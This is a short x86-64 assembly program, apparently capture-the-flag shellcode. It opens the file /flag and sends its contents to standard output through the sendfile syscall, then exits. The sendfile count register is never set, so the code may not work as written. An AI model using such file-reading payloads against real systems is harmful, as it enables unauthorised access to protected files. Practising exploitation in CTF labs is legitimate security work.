BITS 64

SECTION .text
	GLOBAL _start

_start:

    ;open file /flag
    mov rax, "/flag"
    push rax

    mov rax, 2
    mov rdi, rsp
    mov rsi, 0
    mov rdx, 0
    syscall  
    mov r8, rax     ;r8 = /flag handle

    ;write /flag to stdout
	mov	rax, 40
    mov	rdi, 1
	mov	rsi, r8
	syscall


;exit
	mov	rdi,0			; result
	mov	rax,60			; exit(2)
	syscall
